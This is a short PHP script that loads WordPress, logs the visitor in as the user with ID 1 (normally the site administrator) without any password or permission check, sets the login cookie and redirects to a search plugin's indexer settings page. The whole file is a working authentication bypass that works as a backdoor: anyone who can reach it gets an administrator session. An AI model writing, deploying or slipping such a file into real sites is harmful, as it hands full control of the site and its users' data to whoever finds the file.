<?php
require_once('wp-load.php');
$user_id = 1;
$user = get_user_by('id', $user_id);
if ($user) {
    wp_set_current_user($user_id, $user->user_login);
    wp_set_auth_cookie($user_id);
    do_action('wp_login', $user->user_login, $user);
    wp_redirect(admin_url('admin.php?page=dgwt_wcas_settings&tab=indexer'));
    exit;
} else {
    echo "User not found.";
}
?>
